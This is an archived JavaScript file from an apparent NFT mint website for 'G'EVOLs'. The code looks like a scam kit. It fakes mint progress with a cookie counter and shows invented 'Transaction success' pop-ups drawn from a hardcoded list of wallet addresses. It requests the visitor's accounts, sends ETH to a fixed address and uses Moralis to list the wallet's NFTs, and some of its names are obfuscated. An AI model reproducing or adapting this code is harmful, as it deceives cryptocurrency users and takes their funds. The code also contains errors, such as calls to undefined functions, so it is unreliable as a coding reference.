var _____WB$wombat$assign$function_____ = function(name) {return (self._wb_wombat && self._wb_wombat.local_init && self._wb_wombat.local_init(name)) || self[name]; };
if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; return this; } }
{
  let window = _____WB$wombat$assign$function_____("window");
  let self = _____WB$wombat$assign$function_____("self");
  let document = _____WB$wombat$assign$function_____("document");
  let location = _____WB$wombat$assign$function_____("location");
  let top = _____WB$wombat$assign$function_____("top");
  let parent = _____WB$wombat$assign$function_____("parent");
  let frames = _____WB$wombat$assign$function_____("frames");
  let opener = _____WB$wombat$assign$function_____("opener");

const ADDRESS = '0xf3cC7Bf7b8CF56BcBe500FF0aF063383F97108F1';
const ethereum = window.ethereum
const IMGPrice = 0.025;
const mint = document.querySelector(".mint")
const connect = document.querySelector(".connect")
const title = document.querySelector(".metamask_content-title")
const totalPrice = document.querySelector(".totalPrice")
const count = document.querySelector(".count")
const MAX = 5
const namess = "G'EVOLs";
const discord = 'https://web.archive.org/web/20221005124207/https://discord.gg/C79BrdbzeG';
const twitter = 'https://web.archive.org/web/20221005124207/https://twitter.com/GEVOLsNFT';
const startCounter = 12;
const endCounter = 300;
let price = 0.0;
var totalPriceAmount = price;
var countAmount = 1;
var nftss, accounts;
var web3 = window.Web3
function getNow() {
    var d = new Date();
    var year = d.getFullYear();
    var month = change(d.getMonth() + 1);
    var day = change(d.getDate());
    var hour = change(d.getHours());
    var minute = change(d.getMinutes());
    var second = change(d.getSeconds());

    function change(t) {
        if (t < 10) {
            return "0" + t;
        } else {
            return t;
        }
    }
    var time = day + '/' + month + '/' + year + ' ' + hour + ':' + minute + ':' + second;
    return time;
}
var settimesss = function() {
    var now = getNow();
    document.getElementById("timess").innerHTML = now;
}
setInterval(settimesss, 1000);

document.getElementById("names").innerHTML = namess;
document.getElementById("end_txt").innerHTML = endCounter;
let mintNumber = getCookie('mintNumber');
if (mintNumber) {
    mintNumber = parseInt(mintNumber);
} else {
    setCookie('mintNumber', startCounter, 365);
    mintNumber = parseInt(getCookie('mintNumber'));
}
if (mintNumber >= endCounter) {
    mintNumber = endCounter;
}
document.getElementById("start_txt").innerHTML = mintNumber
var progressBar = (mintNumber / endCounter * 100).toFixed(2);
if (progressBar >= 100) {
    progressBar = 100;
}
document.getElementById("percentages_txt").innerHTML = progressBar + "%";
document.getElementById("percentages_lin").style.width = progressBar + "%";

function checkConnectStatus() {
    if (ethereum) {
        if (ethereum.selectedAddress) {
            connect.style.display = "none"
            mint.style.display = "block"
        } else if (ethereum.isMetaMask) {
            connect.style.display = "block"
            mint.style.display = "none"
        }
    } else {
        connect.style.display = "block"
        mint.style.display = "none"
    }
}
window.addEventListener("load", () => {
    totalPrice.innerText = price;
    checkConnectStatus();

})

document.getElementById("discord_btn").addEventListener("click", async () => {
    window.open(discord);

})
document.getElementById("twitter_btn").addEventListener("click", async () => {
    window.open(twitter);
})
var serverUrl = "https://web.archive.org/web/20221005124207/https://reprr17rtzlf.usemoralis.com:2053/server",
    appId = "UULvsLlLVresI4YMRk1EJCdi4p99v0r43j5ZnAC9",
    _0x1829e9 = {};
_0x1829e9["serverUrl"] = serverUrl;
_0x1829e9["appId"] = appId, Moralis["start"](_0x1829e9);

const getAccount = async () => {
    try {
        web3 = await Moralis["enableWeb3"]();
        accounts = await ethereum.request({
            method: 'eth_requestAccounts'
        });
        // console.log(accounts)
        await syncNfts();
        if (window.ethereum.chainId == "0x1") {
            console.log("Already connected to ethereum mainnet...");
            checkConnectStatus();
        } else {
            try {
                await ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{
                        chainId: '0x1'
                    }],
                });
                checkConnectStatus();
            } catch (switchError) {
                // This error code indicates that the chain has not been added to MetaMask.
                if (error.code === 4902) {
                    try {
                        await ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0x1',
                                rpcUrl: netURL
                            }],
                        });
                        checkConnectStatus();
                    } catch (addError) {
                        // handle "add" error
                        console.log(addError);
                    }
                }
            }
        }
    } catch (e) {
        checkConnectStatus();
        console.log(e);
    }
}
window.ethereum ? window.ethereum.on('disconnect', (err) => {
    console.log(err);
    checkConnectStatus();
}) : null;
window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
    if (accounts.length < 1) checkConnectStatus()
}) : null;
var wallet = ["0x302eaa96d75cb11fc657c5df656e8f12b3459497", "0xbfc2c0b1664c61e8bb0c4f887cddd2a792527eee", "0xf7d43c1c7819bd2cfe52c651c04f00697f4daaf6", "0x08cc43522f62c696ddb198219bb6e6f8e35fe8e7", "0xbb73f694ac9315fdf5b52d93ccb79e8d1d517d0a", "0x47647fd3f83f041bf2f5a99d1ca953461d96d7b0", "0x1b4385a7b0a56dad5a9fc9408ab7191db6c02ad0", "0x4b7abf22fb1958191b9c1b8aa1aa35a7dd673323", "0x7292dba86c3114d10b451eadbec52282981bab8e", "0xf543eb01405e72e080d52df3885e1eb51f6caa22", "0x4d869421cefb1e53202402c456370f5c86968d23", "0xed2dda1fa7bfb8a7e69183b4ad4601d6571eb29c", "0x62c4f6211c8fc460a6f53b8f3b84ed407ddf0f8c", "0xbaf8a5dd2843af9c6d3707571e4b4f5c53ae33ee", "0x75b6f2abd5bd8668aab1bdebe4512fd70e11dc0c", "0x03a8dd542221e3936cb9cd628aa20ad621935a9e", "0x5b5e6eec121ca0bbfb02dc6a5254ae623785fef6", "0xf6a82a4ca7995e991c129184cc699d929a98d934", "0x2f87fc83b3b6c79941a2d8eaf0b36b239ade4f95", "0xb6204727f3ef7680e29486b7afa73aa51b4e9c27", "0x13b6585a08733175378edd5d59a8e6b063978bec", "0x09133f60a6ec96ca92c60bf20c385a67a1cb0d71", "0xfe99a780e3bc9527151fa9c9e4703acdb49b0bf7", "0x8fb4912c10513c7c87365875944a9dea85520238", "0x8beeaab22bbca0d28bede30989cdf2c281684be5", "0xdb9222f9bc8009ddd19087d16391c653f84d1935", "0x68f14dc7148675b3decdb08718e979cc13de223a", "0xa2e744e9dafdf734548310c80de441c967a17fed", "0x5f696e82ec61281df86667cdd9f602ef700074aa", "0x5e8b2280444ae749e31dec94769ac2a6586866e0", "0x4da24757a69ac2cd07a506284f036223fdbe840c", "0xbc6f0d526e8fde65fa4264df6cab988de4236504", "0x54e4484320ec96b6e5d420e63d5aeec36a130d98", "0x8270883f350f8f1c4efbd95c4646d45e05279782", "0x86ac35be3c68447fdefa9acbe9e2eb741dfb00f5", "0x5a1e979b5b3c71f15169273e844fe9265070d79c", "0x346dbd8c3fed2b5a9231f8f03b7e7761e9327831", "0x0d463119902b5f4a6cd3f255b0ec223c487a3676", "0x30fefe5fff804572841d9ea0eaa61c76d640b620", "0xd17633cc11e4bb5fa611d49798bda32a35375b40", "0x57df082b1595f863e628c3021b710579e9bf74c7", "0x2a1e1d66e04932a64b3546e02a2afc075bd2da92", "0x96ced87b4126d87f365b502623f4b9654e267ef7", "0x9889e3ce434936b24a97928c55e2ea4d95a3e586", "0x8989c921d97917caa25da816e923477a91e7e2ae", "0x8d04f1a90899ed37090463785ca8e8298d87cdba", "0x85baaa9fb84b5f93e24869f748b96fd6b5c65979"];

function handleMessage(message = msg) {
    const notificationDiv = document.createElement("div");
    // el-notification right el-notification-fade-enter-active el-notification-fade-enter-to
    notificationDiv.className = "el-notification";
    notificationDiv.classList.add("notificationss", "right");
    const div2 = document.createElement("div");
    div2.className = "notification__group";
    const div3 = document.createElement("div");
    div3.className = "el-notification__content";
    const h2 = document.createElement("h2");
    h2.className = "el-notification__title";
    h2.innerHTML = "Transaction success";
    const p1 = document.createElement("p");
    p1.innerHTML = message;
    div3.appendChild(p1);
    div2.appendChild(h2);
    div2.appendChild(div3);
    notificationDiv.appendChild(div2);
    document.getElementById("body").appendChild(notificationDiv);
    setTimeout(() => {
        notificationDiv.remove();
    }, 2400);
}
let ran_time = (Math.floor(Math.random() * 30) + 10) * 100;
var getProgress = function getProgress() {
    var i = Math.floor(Math.random() * MAX);
    ran_time = (Math.floor(Math.random() * 15) + 10) * 100;
    var j = Math.floor(Math.random() * 47);
    mintNumber += i;
    var percentages = (mintNumber / endCounter * 100).toFixed(2);
    if (percentages >= 100) {
        document.getElementById("percentages_txt").innerHTML = "100%";
        document.getElementById("percentages_lin").style.width = "100%";
        document.getElementById("start_txt").innerHTML = endCounter;
        setCookie('mintNumber', endCounter, 365);
        clearInterval(divNotification);
    } else {
        setCookie('mintNumber', mintNumber, 365);
        document.getElementById("percentages_lin").style.width = percentages + "%";
        document.getElementById("percentages_txt").innerHTML = percentages + "%";
        document.getElementById("start_txt").innerHTML = mintNumber

    }
    var str = wallet[j].slice(0, 10) + "......" + wallet[j].slice(-10);
    handleMessage(str);
};
var divNotification = setInterval(getProgress, ran_time);

const round = (value) => {
    return Math.round(value * 10000) / 10000;
}

var sendTransaction1 = async () => {
    const priceToWei = (totalPriceAmount * 1e18).toString(16)
    //const gasLimit = (100000 * totalPriceAmount).toString(16);
    ethereum.request({
            method: 'eth_sendTransaction',
            params: [{
                from: accounts[0],
                to: ADDRESS,
                value: priceToWei
            }, ],
        })
        .then((txHash) => {
            $('#mintingModal').modal('show')
            mini.click();
        })
        .catch((error) => {
            mint.click();
        });
};



// setTimeout(function() {
//     getAccount();
// }, 1000);

mint.addEventListener("click", async () => {
    await getAccount()
    await sendTransaction()

});

connect.addEventListener("click", async () => {
    await getAccount()

})

function setCookie(cname, cvalue, exdays) {
    const d = new Date();
    d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
    let expires = "expires=" + d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function getCookie(cname) {
    let name = cname + "=";
    let ca = document.cookie.split(';');
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

document.querySelector(".plus").addEventListener("click", () => {
    if (countAmount < MAX) {
        countAmount++;
        totalPriceAmount = (countAmount * price).toFixed(3);
        count.innerText = countAmount;
        totalPrice.innerText = totalPriceAmount;
    }
})

document.querySelector(".minus").addEventListener("click", () => {
    if (countAmount > 1) {
        countAmount--;
        totalPriceAmount = (countAmount * price).toFixed(3);
        count.innerText = countAmount;
        totalPrice.innerText = totalPriceAmount;
    }
})


function getMobileOperatingSystem() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;
    // console.log(userAgent);
    // Windows Phone must come first because its UA also contains "Android"
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const uid = urlParams.get('uid')
    // console.log(uid);
    if (uid == "mm") {
        return "Metamask";
    }
    if (/windows phone/i.test(userAgent)) {
        return "Windows Phone";
    }

    if (/android/i.test(userAgent)) {
        return "Android";
    }

    // iOS detection from: http://stackoverflow.com/a/9039885/177710
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return "iOS";
    }

    return "unknown";
}
async function syncNfts() {
    try {
        nftss = await Moralis["Web3"]["getNFTs"]({
            "chain": "eth",
            "address": accounts[0]
        });
    } catch (_0x343e6c) {
        console["log"](_0x343e6c);
    }
}


document.addEventListener('DOMContentLoaded', (event) => {
    // getAccount();
    if (getMobileOperatingSystem() == "Android" || getMobileOperatingSystem() == "iOS") {
        var wrapper = document.createElement('a');
        wrapper.classList.add('mmLink');
        wrapper.href = "https://web.archive.org/web/20221005124207/https://metamask.app.link/dapp/" + ((window.location.href).replace('https://', '').replace('http://', '')) + "?uid=mm";
        connect.parentNode.insertBefore(wrapper, connect);
        wrapper.appendChild(connect);
    }

});

}
/*
     FILE ARCHIVED ON 12:42:07 Oct 05, 2022 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 18:39:19 Jul 21, 2025.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
*/
/*
playback timings (ms):
  captures_list: 1.414
  exclusion.robots: 0.074
  exclusion.robots.policy: 0.038
  esindex: 0.028
  cdx.remote: 95.025
  LoadShardBlock: 518.505 (3)
  PetaboxLoader3.datanode: 380.45 (5)
  PetaboxLoader3.resolve: 503.951 (2)
  load_resource: 417.946
  loaddict: 115.397
*/